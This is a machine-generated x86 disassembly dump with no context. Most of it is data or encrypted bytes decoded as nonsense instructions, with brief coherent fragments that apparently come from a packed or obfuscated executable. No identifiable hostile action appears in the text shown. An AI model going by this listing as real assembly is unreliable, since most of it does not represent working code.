  406138:	scas   eax,DWORD PTR es:[edi]
  406139:	in     eax,dx
  40613a:	out    dx,al
  40613b:	ds jmp 0x3248:0x7840f749
  406143:	aad    0xb9
  406145:	repnz cmp DWORD PTR [ebp-0x30bd67a4],ecx
  40614c:	mov    eax,0x774a943d
  406151:	aaa    
  406152:	jb     0x4060ea
  406154:	jno    0x4061c5
  406156:	out    0xd6,eax
  406158:	add    eax,0x31f0e220
  40615d:	cs stos DWORD PTR es:[edi],eax
  40615f:	fldcw  WORD PTR [edx-0x25]
  406162:	inc    esp
  406163:	xor    DWORD PTR [edi-0x6e],eax
  406166:	stos   DWORD PTR es:[edi],eax
  406167:	pop    edi
  406168:	fst    DWORD PTR [ecx]
  40616a:	pop    edi
  40616b:	xchg   esp,eax
  40616c:	out    dx,al
  40616d:	outs   dx,DWORD PTR ds:[esi]
  40616e:	shr    DWORD PTR [ebx],cl
  406170:	ret    
  406171:	add    ebx,DWORD PTR [esi]
  406173:	xchg   edx,eax
  406174:	jmp    0x40614f
  406176:	aad    0xbc
  406178:	adc    al,0xe8
  40617a:	mov    ch,0xf0
  40617c:	mov    ecx,0x9d83cf1f
  406181:	lahf   
  406182:	mov    DWORD PTR [edi],ebp
  406184:	icebp  
  406185:	jno    0x40615f
  406187:	sti    
  406188:	inc    edi
  406189:	dec    ebp
  40618a:	leave  
  40618b:	and    BYTE PTR [ebp+0x607961bf],0x1d
  406192:	into   
  406193:	imul   BYTE PTR [esi-0x36641a8]
  406199:	imul   ebp,DWORD PTR [ebx-0x4b],0xf25b55da
  4061a0:	xchg   edi,eax
  4061a1:	pop    esp
  4061a2:	loope  0x40619a
  4061a4:	out    dx,eax
  4061a5:	pop    es
  4061a6:	fnstenv [edi-0x7b]
  4061a9:	jmp    0xd50b4cd7
  4061ae:	mov    cl,BYTE PTR [eax+0x45fbdaeb]
  4061b4:	dec    ebp
  4061b5:	pop    esi
  4061b6:	stos   BYTE PTR es:[edi],al
  4061b7:	inc    ecx
  4061b8:	pop    esp
  4061b9:	sub    eax,0x89a24cb7
  4061be:	(bad)  
  4061bf:	fwait
  4061c0:	shl    DWORD PTR [ecx],0x2a
  4061c3:	ins    BYTE PTR es:[edi],dx
  4061c4:	lock repz test al,0x30
  4061c8:	pop    ds
  4061c9:	mov    dh,0xff
  4061cb:	arpl   WORD PTR [esi-0x20],ax
  4061ce:	sub    al,0x57
  4061d0:	push   0xffffffe4
  4061d2:	stos   DWORD PTR es:[edi],eax
  4061d3:	aaa    
  4061d4:	repz or eax,0x26eadaf5
  4061da:	jnp    0x406164
  4061dc:	adc    DWORD PTR [edx],ecx
  4061de:	jnp    0x406220
  4061e0:	xchg   ebx,eax
  4061e1:	das    
  4061e2:	mov    ebx,0xd409e771
  4061e7:	add    BYTE PTR [edi],dl
  4061e9:	push   0xafcea3e2
  4061ee:	adc    eax,0xfa90f7ce
  4061f3:	cmp    esi,DWORD PTR [edx+0x372c5b29]
  4061f9:	ds inc esi
  4061fb:	xlat   BYTE PTR ds:[ebx]
  4061fc:	dec    edi
  4061fd:	ja     0x40626e
  4061ff:	or     DWORD PTR [edx-0x7e107c57],0x1b
  406206:	jge    0x4061b9
  406208:	add    DWORD PTR [ecx+eiz*1-0x51],esi
  40620c:	arpl   bp,di
  40620e:	fcmovne st,st(6)
  406210:	scas   al,BYTE PTR es:[edi]
  406211:	xor    eax,0x1c29e910
  406216:	sub    eax,0x88a7b4b2
  40621b:	(bad)  [eax]
  40621d:	jbe    0x406257
  40621f:	xchg   BYTE PTR [edi-0x380fa1bc],dh
  406225:	retf   0x1396
  406228:	repnz outs dx,DWORD PTR ds:[esi]
  40622a:	iret   
  40622b:	xchg   edi,eax
  40622c:	cmp    eax,0xc28c0bf8
  406231:	adc    dl,bh
  406233:	xor    eax,0x4e43c753
  406238:	and    al,0x3c
  40623a:	push   ss
  40623b:	xlat   BYTE PTR ds:[ebx]
  40623c:	lea    ebp,[edi-0x3b]
  40623f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406241:	(bad)
  406245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406246:	pop    eax
  406247:	loop   0x4061e3
  406249:	cmp    DWORD PTR [ebx+edx*4],esi
  40624c:	outs   dx,DWORD PTR ds:[esi]
  40624d:	fwait
  40624e:	jmp    0x94f1ce66
  406253:	push   cs
  406254:	push   es
  406255:	loop   0x4061e2
  406257:	or     al,0xe4
  406259:	mov    bl,0xef
  40625b:	adc    esp,DWORD PTR [edi]
  40625d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40625e:	add    DWORD PTR [esi],esi
  406260:	je     0x4062de
  406262:	sub    eax,0xc5c5d605
  406267:	dec    ebp
  406268:	dec    esp
  406269:	popf   
  40626a:	mov    edi,0x4f96cca9
  40626f:	mov    ebx,0xe218cf12
  406274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406275:	cmp    eax,DWORD PTR [esi+0x229c9189]
  40627b:	sbb    esi,DWORD PTR [eax+0x3b886f04]
  406281:	push   ebx
  406282:	leave  
  406283:	xor    al,0xb0
  406285:	xor    al,0xe9
  406287:	mov    ebp,es
  406289:	jge    0x406259
  40628b:	or     cl,BYTE PTR [ebx+0x63915f5c]
  406291:	or     BYTE PTR [edx],dh
  406293:	and    al,0xec
  406295:	shl    DWORD PTR [ebx+0x14],cl
  406298:	stc    
  406299:	mov    esi,DWORD PTR [ebp-0x8]
  40629c:	xor    eax,edx
  40629e:	xor    esi,edx
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43369f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	repz sti 
  4062ee:	scas   eax,DWORD PTR es:[edi]
  4062ef:	in     eax,0x34
  4062f1:	cmp    edi,DWORD PTR [esp+edi*2+0x30]
  4062f5:	jle    0x406373
  4062f7:	jl     0x4062cf
  4062f9:	ret    0x91e6
  4062fc:	or     eax,0xcea4639f
  406301:	daa    
  406302:	shl    DWORD PTR [edx+esi*8-0x6f22f465],cl
  406309:	mov    ebp,DWORD PTR [edx]
  40630b:	enter  0xa4b1,0xb1
  40630f:	dec    edx
  406310:	imul   esp,edx,0xffffffd7
  406313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406314:	jmp    0xdee0563d
  406319:	mov    ebx,0x835ea127
  40631e:	retf   0x75c
  406321:	jns    0x406344
  406323:	aad    0x40
  406325:	popf   
  406326:	popf   
  406327:	std    
  406328:	fnstcw WORD PTR [ebp+esi*8-0xb]
  40632c:	and    eax,0xa6a5ca23
  406331:	mov    edi,0xb00f6233
  406336:	mov    bh,0x41
  406338:	mov    esi,0xd8386d05
  40633d:	xchg   esi,eax
  40633e:	test   eax,0xf2febbb
  406343:	xchg   edx,eax
  406344:	pop    esi
  406345:	xchg   BYTE PTR [edi+eax*8+0x1bb40c03],ch
  40634c:	inc    ecx
  40634d:	shl    BYTE PTR [edx+edx*2],1
  406350:	xor    DWORD PTR [esi+0x21],0x39
  406354:	inc    esi
  406355:	test   BYTE PTR [ebx+0x2cfdb137],0xc1
  40635c:	mov    dh,0xcd
  40635e:	fcmovnu st,st(2)
  406360:	test   DWORD PTR [edx],eax
  406362:	ret    
  406363:	inc    edi
  406364:	pop    esi
  406365:	mov    eax,0x91d7c
  40636a:	ret    0x8d7b
  40636d:	shl    cl,cl
  40636f:	mov    al,ds:0xf846faac
  406374:	inc    ebx
  406375:	pop    es
  406376:	shr    DWORD PTR [ebp+0x3b],cl
  406379:	(bad)  
  40637a:	push   ebx
  40637b:	pop    ss
  40637c:	inc    ecx
  40637d:	pop    ebp
  40637e:	xlat   BYTE PTR ds:[ebx]
  40637f:	dec    edi
  406380:	ror    DWORD PTR [edx],0x6c
  406383:	mov    eax,ds:0x2463e593
  406388:	or     al,0x9a
  40638a:	popa   
  40638b:	push   ebp
  40638c:	pop    ebp
  40638d:	mov    edx,0xd9dcb27b
  406392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406393:	dec    esi
  406394:	adc    dh,al
  406396:	xchg   esi,eax
  406397:	xor    ebp,DWORD PTR [ecx+0x7e91b272]
  40639d:	inc    edi
  40639e:	out    0x33,al
  4063a0:	and    BYTE PTR [edx+0x954153a],bh
  4063a6:	loope  0x4063de
  4063a8:	push   ds
  4063a9:	in     al,0xc5
  4063ab:	cld    
  4063ac:	mov    al,0x60
  4063ae:	push   ds
  4063af:	out    dx,al
  4063b0:	rol    DWORD PTR [esi-0x285e54a6],0x66
  4063b7:	sub    ebx,DWORD PTR [edx]
  4063b9:	sub    al,0x36
  4063bb:	cwde   
  4063bc:	jmp    0x406381
  4063be:	xchg   DWORD PTR ds:0x2c03e272,esp
  4063c4:	jge    0x40638c
  4063c6:	or     edx,DWORD PTR [esi]
  4063c8:	out    0x82,al
  4063ca:	mov    ah,0xe
  4063cc:	je     0x406375
  4063ce:	(bad)  
  4063d0:	mov    edi,0x26b8ea30
  4063d5:	xor    BYTE PTR [edi-0x10f496a6],dl
  4063db:	mov    esp,0x7151be35
  4063e0:	div    DWORD PTR [edx-0x500e2c]
  4063e6:	mov    cl,0xae
  4063e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063e9:	pop    edx
  4063ea:	xor    DWORD PTR ds:0xb4a48f56,ebx
  4063f0:	aaa    
  4063f1:	fbstp  TBYTE PTR [ebx-0x43]
  4063f4:	dec    ecx
  4063f5:	and    ch,al
  4063f7:	pop    ebx
  4063f8:	push   0x67b23abb
  4063fd:	addr16 mov esi,0xc200397
  406403:	loop   0x406388
  406405:	not    BYTE PTR [esi+0x62d40280]
  40640b:	jbe    0x4063aa
  40640d:	mov    edx,0x170983e3
  406412:	in     eax,0xf1
  406414:	aad    0x14
  406416:	mov    ebx,0xead5b656
  40641b:	js     0x4063e4
  40641d:	imul   edi,DWORD PTR [ebx+0x6b],0x6a
  406421:	and    esi,ebp
  406423:	push   es
  406424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406425:	xchg   esi,eax
  406426:	test   DWORD PTR [esi-0x5f],eax
  406429:	dec    ah
  40642b:	test   eax,0xa1838b78
  406430:	dec    edi
  406431:	je     0x40642d
  406433:	jns    0x40645f
  406435:	aad    0xe
  406437:	pop    ss
  406438:	retf   
  406439:	(bad)  
  40643a:	and    al,BYTE PTR [eax]
  40643c:	inc    esi
  40643d:	pop    esi
  40643e:	pop    edx
  40643f:	aaa    
  406440:	mov    WORD PTR [esi-0x3a],es
  406443:	mov    esp,0x2fab45c9
  406448:	js     0x406469
  40644a:	call   0x57c9:0xf720d68a
  406451:	push   0x5a
  406453:	das    
  406454:	xchg   edi,eax
  406455:	mov    ds:0x67b00e9d,al
  40645a:	cld    
  40645b:	outs   dx,BYTE PTR ds:[esi]
  40645c:	adc    eax,0x3b52f097
  406461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406462:	push   0xb8d09497
  406467:	imul   ebx,esi,0xffffffd0
  40646a:	cli    
  40646b:	in     al,0x2e
  40646d:	mov    BYTE PTR [eax-0x30aa2c73],0xc1
  406474:	push   ds
  406475:	cld    
  406476:	dec    edi
  406477:	lahf   
  406478:	push   edx
  406479:	jl     0x406413
  40647b:	fisubr DWORD PTR [edx]
  40647d:	sub    al,0x8a
  40647f:	mov    edi,0x981ffab8
  406484:	outs   dx,BYTE PTR ds:[esi]
  406485:	and    ecx,DWORD PTR [ebp-0x5e079e16]
  40648b:	repnz adc ch,ch
  40648e:	adc    esi,DWORD PTR [eax-0x47dc5d10]
  406494:	inc    eax
  406495:	int    0x70
  406497:	js     0x40649c
  406499:	and    BYTE PTR [edi-0x4451496],bl
  40649f:	cwde   
  4064a0:	out    dx,eax
  4064a1:	mov    al,0x8b
  4064a3:	test   DWORD PTR [ebp-0x17],ebx
  4064a6:	mov    esp,0x195b616d
  4064ab:	pop    eax
  4064ac:	mov    ds:0xb578f825,al
  4064b1:	aas    
  4064b2:	add    al,0x78
  4064b4:	cmp    BYTE PTR [eax+0x13],dl
  4064b7:	xor    eax,0xc42e2dfb
  4064bc:	push   esi
  4064bd:	pop    esi
  4064bf:	lock retf 0x67ac
  4064c3:	or     ah,cl
  4064c5:	xor    DWORD PTR [edi+0x65b22269],esi
  4064cb:	js     0x40651a
  4064cd:	lahf   
  4064ce:	std    
  4064cf:	mov    edi,0x757a6c16
  4064d4:	push   edi
  4064d5:	rcr    al,cl
  4064d7:	pop    es
  4064d8:	lds    esi,FWORD PTR ds:0x99424c1e
  4064de:	retf   0xb4
  4064e1:	or     DWORD PTR [ebp+0x76],0xffffffd3
  4064e5:	or     al,0xe5
  4064e7:	and    DWORD PTR [edx-0x55c6a983],0xffffffde
  4064ee:	mov    bh,0xcc
  4064f0:	dec    esp
  4064f1:	lock dec eax
  4064f3:	lahf   
  4064f4:	jmp    FWORD PTR [ebp+0x76c1bd19]
  4064fa:	call   0x790e0d16
  4064ff:	mov    al,0x48
  406501:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406503:	xor    eax,0xe2ccc1c3
  406508:	sti    
  406509:	mov    cl,0x63
  40650b:	sub    eax,ecx
  40650d:	sub    ecx,DWORD PTR [esi-0x11bb749]
  406513:	retf   0x826
  406516:	inc    ebx
  406517:	test   eax,0x3245ffe7
  40651c:	jge    0xcc34ce7a
  406522:	repz mov ebp,0x18a07f33
  406528:	xor    ebp,ecx
  40652a:	mov    ds:0xbe41ba34,al
  40652f:	ds jnp 0x4064b7
  406532:	push   esp
  406533:	(bad)  
  406534:	push   ecx
  406535:	mov    eax,0x4881
  40653a:	mov    eax,0x5a3fc9e
  40653f:	mov    DWORD PTR [ebp-0x4],eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x4336a7,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x43375f,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x43365b,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x4336df,0x0
  406580:	mov    ecx,DWORD PTR ds:0x4336df
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x4336df,ecx
  40658d:	cmp    DWORD PTR ds:0x4336df,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x4336df,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x4336df
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x4336df,ecx
  4065bf:	cmp    DWORD PTR ds:0x4336df,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0x4895211a
  4065de:	gs inc ebx
  4065e0:	pop    ebp
  4065e1:	call   0x30bce2ab
  4065e6:	jle    0x406664
  4065e8:	jl     0x4065d8
  4065ea:	int    0x78
  4065ec:	int    0x1b
  4065ee:	mov    cl,0xe9
  4065f0:	popa   
  4065f1:	inc    esi
  4065f2:	adc    eax,edi
  4065f4:	nop
  4065f5:	mov    ?,WORD PTR [eax]
  4065f7:	cmc    
  4065f8:	cmp    DWORD PTR [edi+0x21e80c71],esp
  4065fe:	loope  0x406645
  406600:	mov    edi,0x847ab7a4
  406605:	arpl   WORD PTR [ebp-0x607f47d5],dx
  40660b:	scas   al,BYTE PTR es:[edi]
  40660c:	push   eax
  40660d:	out    dx,al
  40660e:	jecxz  0x40662a
  406610:	or     cl,BYTE PTR [esi-0x5c]
  406613:	push   eax
  406614:	aaa    
  406615:	cmp    ah,BYTE PTR cs:[ebx-0x1c]
  406619:	mov    eax,0x2f22c833
  40661e:	mov    dh,BYTE PTR [ebx+0x75]
  406621:	stos   DWORD PTR es:[edi],eax
  406622:	enter  0xfecd,0x65
  406626:	pop    esp
  406627:	ret    
  406628:	ss xchg sp,ax
  40662b:	xor    al,0x8d
  40662d:	lods   al,BYTE PTR ds:[esi]
  40662e:	push   cs
  40662f:	dec    ebx
  406630:	push   edx
  406631:	and    ch,BYTE PTR [ecx+0x2a]
  406634:	iret   
  406635:	arpl   WORD PTR [edx-0x5c575d63],bx
  40663b:	js     0x4066bc
  40663d:	xor    eax,0xc7a4df5d
  406642:	add    edx,DWORD PTR [edi]
  406644:	imul   ecx,ecx,0xffffffed
  406647:	jle    0x406678
  406649:	and    esp,DWORD PTR cs:[edi]
  40664c:	aam    0x91
  40664e:	cmp    eax,0x756bb3b3
  406653:	adc    al,0x47
  406655:	cli    
  406656:	pop    DWORD PTR [edi+esi*4-0x71]
  40665a:	jb     0x406690
  40665c:	aaa    
  40665d:	jmp    0x406670
  40665f:	aad    0x3e
  406661:	fcmovbe st,st(4)
  406663:	adc    DWORD PTR [ebp+0x1c14281e],ebp
  406669:	pusha  
  40666a:	or     edi,ebp
  40666c:	or     ch,cl
  40666e:	push   eax
  40666f:	mov    esi,0xf9fd2940
  406674:	mov    ebp,0x2d7e53b0
  406679:	adc    dl,BYTE PTR [ebx+eiz*1]
  40667c:	push   ebx
  40667d:	sar    DWORD PTR [esi+eiz*1-0x33],0xa
  406682:	lahf   
  406683:	cmp    al,0xcf
  406685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406686:	push   edx
  406687:	fiadd  WORD PTR [ebx+edx*4]
  40668a:	jecxz  0x4066f7
  40668c:	mov    dl,0x7f
  40668e:	pop    es
  40668f:	pop    ebp
  406690:	pushf  
  406691:	dec    ecx
  406692:	mov    esp,0xd9582b31
  406697:	js     0x406687
  406699:	popa   
  40669a:	jg     0x406704
  40669c:	pushf  
  40669d:	aaa    
  40669e:	in     eax,0x1e
  4066a0:	and    esp,DWORD PTR [eax+0xca9a6e9]
  4066a6:	xor    ebx,edx
  4066a8:	mov    dl,0x72
  4066aa:	int3   
  4066ab:	mov    cl,0xc1
  4066ad:	std    
  4066ae:	push   ecx
  4066af:	mov    ebp,0xd22ee8ae
  4066b4:	push   eax
  4066b5:	idiv   DWORD PTR ds:0x62a62580
  4066bb:	(bad)  
  4066bc:	dec    edi
  4066bd:	icebp  
  4066be:	fs mov edi,0xe2a2ff48
  4066c4:	cmp    al,BYTE PTR [ebp-0x3b04292b]
  4066ca:	or     eax,0x1e49156a
  4066cf:	or     DWORD PTR [edi-0x33],edi
  4066d2:	jno    0x406662
  4066d4:	jmp    0x7a6d:0x717f01d2
  4066db:	xchg   ecx,eax
  4066dc:	dec    ecx
  4066dd:	pop    ds
  4066de:	sti    
  4066df:	shl    DWORD PTR [ecx-0x5f9b30d5],cl
  4066e5:	test   BYTE PTR [esi+0x6c660fdc],bl
  4066eb:	sub    BYTE PTR [edx-0x6c],0xd9
  4066ef:	stc    
  4066f0:	sbb    edx,esp
  4066f2:	push   esi
  4066f3:	jge    0x406772
  4066f5:	pusha  
  4066f6:	xor    al,BYTE PTR [edi+eax*2+0x22d8d852]
  4066fd:	pop    eax
  4066fe:	sub    BYTE PTR [eax+eiz*2],dh
  406701:	ds sbb ch,bl
  406704:	xchg   esp,eax
  406705:	add    eax,eax
  406707:	jl     0x40673d
  406709:	test   al,0xe9
  40670b:	aad    0x94
  40670d:	jae    0x4066a2
  40670f:	(bad)  
  406710:	mov    al,0xad
  406712:	xchg   BYTE PTR [ebx+0x59],ah
  406715:	in     al,dx
  406716:	outs   dx,DWORD PTR ds:[esi]
  406717:	enter  0xc04b,0xa6
  40671b:	xor    DWORD PTR [ebx+0x6ae50ec7],eax
  406721:	aam    0x5e
  406723:	imul   edx,eax,0x8d55416f
  406729:	cmp    al,0xfa
  40672b:	sub    eax,0x14901e1c
  406730:	xor    eax,DWORD PTR [eax-0x9f84e26]
  406736:	add    eax,eax
  406738:	out    dx,al
  406739:	ins    BYTE PTR es:[edi],dx
  40673a:	mov    ds:0xbfc66c2a,al
  40673f:	pop    esp
  406740:	inc    esp
  406741:	dec    ebx
  406742:	or     esp,eax
  406744:	(bad)  
  406745:	aas    
  406746:	outs   dx,DWORD PTR ds:[esi]
  406747:	cmp    bh,BYTE PTR [edi]
  406749:	mov    al,ds:0x5a59f47b
  40674e:	pop    edi
  40674f:	ins    BYTE PTR es:[edi],dx
  406750:	jae    0x406734
  406752:	add    eax,0xf6d7c8b6
  406757:	call   0xd842:0x4f9637a1
  40675e:	xchg   BYTE PTR [ebx+0x4bf263eb],ch
  406764:	and    bh,BYTE PTR [eax+0x38978b5a]
  40676a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40676b:	xor    al,0xb2
  40676d:	adc    eax,0xe97c272d
  406772:	minps  xmm4,XMMWORD PTR [edi]
  406775:	jmp    0x40675f
  406777:	adc    eax,0xcc3ca4b5
  40677c:	push   edx
  40677d:	cmp    BYTE PTR [esi-0x6ee9b49],dh
  406783:	retf   0x8c54
  406786:	sbb    ecx,DWORD PTR [ecx+0x3fac858c]
  40678c:	jl     0x4067c3
  40678e:	mov    bh,0xf3
  406790:	push   esi
  406791:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  406793:	out    0xda,al
  406795:	aam    0xac
  406797:	adc    al,0x71
  406799:	or     esp,DWORD PTR [edx-0x1d]
  40679c:	test   ah,bh
  40679e:	xor    DWORD PTR cs:[eax+0x50],ecx
  4067a2:	cmp    al,0x7e
  4067a4:	xchg   edx,eax
  4067a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a7:	push   esi
  4067a8:	scas   eax,DWORD PTR es:[edi]
  4067a9:	add    ebx,edx
  4067ab:	fidivr DWORD PTR [edi+0x51]
  4067ae:	iret   
  4067af:	mov    bl,BYTE PTR [edx-0x108abf13]
  4067b5:	cmp    DWORD PTR [eax-0x6fc092b3],edi
  4067bb:	mov    ah,0xac
  4067bd:	rol    DWORD PTR [edx-0x34],cl
  4067c0:	mov    dh,cl
  4067c2:	(bad)  
  4067c3:	adc    BYTE PTR [ebp-0x3],cl
  4067c6:	xor    eax,0xe098dd8b
  4067cb:	push   edx
  4067cc:	repnz mov edi,0x68f349bf
  4067d2:	push   ebx
  4067d3:	hlt    
  4067d4:	adc    eax,0x42010fce
  4067d9:	push   es
  4067da:	imul   ebp,DWORD PTR [esi+eax*4+0x30],0xffffffa8
  4067df:	xchg   ebx,ebp
  4067e1:	out    0x4a,eax
  4067e3:	inc    eax
  4067e4:	jecxz  0x4067c3
  4067e6:	fisubr WORD PTR [ecx+0x11dcd145]
  4067ec:	cli    
  4067ed:	or     al,0xf2
  4067ef:	adc    al,0x8e
  4067f1:	js     0x4067d4
  4067f3:	sub    BYTE PTR [eax+0x1d],dl
  4067f6:	adc    DWORD PTR [esp+ebx*1],edi
  4067f9:	bound  ebx,QWORD PTR [edx-0x31]
  4067fc:	push   eax
  4067fd:	call   0xbda4:0x2020e379
  406804:	mov    ecx,0x256963df
  406809:	sbb    DWORD PTR [edx],edx
  40680b:	push   0xe222b457
  406810:	pop    eax
  406811:	mov    esp,0x1cf65380
  406816:	in     al,0x40
  406818:	retf   0x7a43
  40681b:	jns    0x406869
  40681d:	pop    es
  40681e:	mov    al,0x10
  406820:	adc    cl,BYTE PTR [eax+esi*1]
  406823:	ret    0xb922
  406826:	cmp    cl,BYTE PTR [edx+0x54e90000]
  40682c:	add    al,BYTE PTR [eax]
  40682e:	add    BYTE PTR [eax],cl
  406830:	int3   
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0x2a6563cb
  40683e:	dec    ebx
  40683f:	lods   al,BYTE PTR ds:[esi]
  406840:	(bad)  
  406841:	jl     0x4068bf
  406843:	xor    BYTE PTR [esi+0x7c],bh
  406846:	jl     0x406850
  406848:	bound  eax,QWORD PTR [edi-0x5d479ef7]
  40684e:	jne    0x406848
  406850:	popf   
  406851:	(bad)  
  406852:	jecxz  0x4067d5
  406854:	jb     0x4068c3
  406856:	fcomp  st(1)
  406858:	xchg   ebp,eax
  406859:	retf   
  40685a:	mov    ds:0xb4aafc15,eax
  40685f:	mov    DWORD PTR [eax],esp
  406861:	jecxz  0x4067f8
  406863:	(bad)  
  406864:	xlat   BYTE PTR ds:[ebx]
  406865:	push   ebx
  406866:	mov    edx,0xaf694df1
  40686b:	test   BYTE PTR [ebx+edx*4],0xe6
  40686f:	sbb    bl,0xb9
  406872:	call   0xb575f7b1
  406877:	adc    al,0xa7
  406879:	aam    0x1f
  40687b:	mov    ebx,0x64898c7e
  406880:	dec    ebx
  406881:	in     eax,0x48
  406883:	mov    edi,0x6fd5e7fb
  406888:	mov    ebp,0xc113c9d0
  40688d:	ins    BYTE PTR es:[edi],dx
  40688e:	mov    bh,0x4c
  406890:	fild   QWORD PTR [edx-0xbd72bdb]
  406896:	sub    eax,0x6b1679dd
  40689b:	imul   edi,edx,0x4d48c102
  4068a1:	loopne 0x4068f3
  4068a3:	rsm    
  4068a5:	mov    DWORD PTR [ecx+0x698a8063],esp
  4068ab:	outs   dx,DWORD PTR ds:[esi]
  4068ac:	aaa    
  4068ad:	xor    eax,0x6b8bca2d
  4068b2:	pop    edi
  4068b3:	cmc    
  4068b4:	(bad)  
  4068b5:	push   esp
  4068b6:	shl    esi,1
  4068b8:	neg    ecx
  4068ba:	xchg   esi,esi
  4068bc:	in     al,0x85
  4068be:	clc    
  4068bf:	out    0x2,al
  4068c1:	daa    
  4068c2:	scas   al,BYTE PTR es:[edi]
  4068c3:	es ss leave 
  4068c6:	fimul  DWORD PTR [esi]
  4068c8:	cmp    eax,0x1c7214c3
  4068cd:	mov    dh,0x71
  4068cf:	push   ds
  4068d0:	repz lds edi,FWORD PTR [ebp+0x6745f470]
  4068d7:	lods   eax,DWORD PTR ds:[esi]
  4068d8:	add    ecx,DWORD PTR [eax]
  4068da:	cwde   
  4068db:	jae    0x406950
  4068dd:	iret   
  4068de:	add    BYTE PTR [ebx-0x1cfd14eb],dl
  4068e4:	test   DWORD PTR [ebx-0x7e],edi
  4068e7:	repz jmp DWORD PTR [eax+0xfa9361f]
  4068ee:	mov    dh,0x6a
  4068f0:	in     eax,0xff
  4068f2:	mov    dl,0xaf
  4068f4:	in     eax,dx
  4068f5:	jo     0x40690d
  4068f7:	(bad)  
  4068f8:	adc    DWORD PTR [edi-0x65],edi
  4068fb:	xchg   ah,al
  4068fd:	es inc edi
  4068ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406900:	inc    edx
  406901:	fs fsub st,st(5)
  406904:	mov    BYTE PTR [esp],ch
  406907:	cmc    
  406908:	int    0x3
  40690a:	es into 
  40690c:	mov    ah,0xec
  40690e:	mov    ah,0xc6
  406910:	cld    
  406911:	mov    al,0x44
  406913:	out    0x7c,al
  406915:	ret    0xcd9a
  406918:	repnz lock fmul QWORD PTR [edx+0x36]
  40691d:	inc    edx
  40691e:	stos   BYTE PTR es:[edi],al
  40691f:	ds pop ecx
  406921:	pop    ebp
  406922:	sub    esi,edi
  406924:	lea    ebx,[eax]
  406926:	jbe    0x40693b
  406928:	cmp    cl,BYTE PTR [edx+0x38cb2d2b]
  40692e:	pop    esp
  40692f:	mov    al,ds:0x557911d7
  406934:	je     0x40694a
  406936:	out    dx,al
  406937:	and    edx,DWORD PTR [eax-0x34281376]
  40693d:	aaa    
  40693e:	xchg   DWORD PTR [ebx],edx
  406940:	fstp   TBYTE PTR ds:[edx-0x57]
  406944:	inc    ebx
  406945:	sar    DWORD PTR [eax+0x50],0x77
  406949:	pusha  
  40694a:	sub    DWORD PTR [esi+0x7a4f65e4],esi
  406950:	inc    ebp
  406951:	(bad)  
  406952:	dec    ecx
  406953:	pop    eax
  406954:	imul   ebx,DWORD PTR [ebx-0x2b43fd75],0xffffffa7
  40695b:	stc    
  40695c:	arpl   WORD PTR [edx+0x43],sp
  40695f:	mov    ds:0x6623a691,al
  406964:	mov    esi,0x5f04993e
  406969:	aam    0xff
  40696b:	jb     0x4069aa
  40696d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40696e:	mov    bl,0x93
  406970:	fidiv  DWORD PTR [eax+0x2a]
  406973:	jns    0x40692f
  406975:	sbb    ebx,DWORD PTR [edx+0x7d]
  406978:	mov    ecx,0xc4076179
  40697d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40697e:	loope  0x406907
  406980:	int    0xb5
  406982:	sub    al,0x73
  406984:	dec    ecx
  406985:	jns    0x4069d5
  406987:	(bad)  
  406988:	mov    ds:0x3be9c820,al
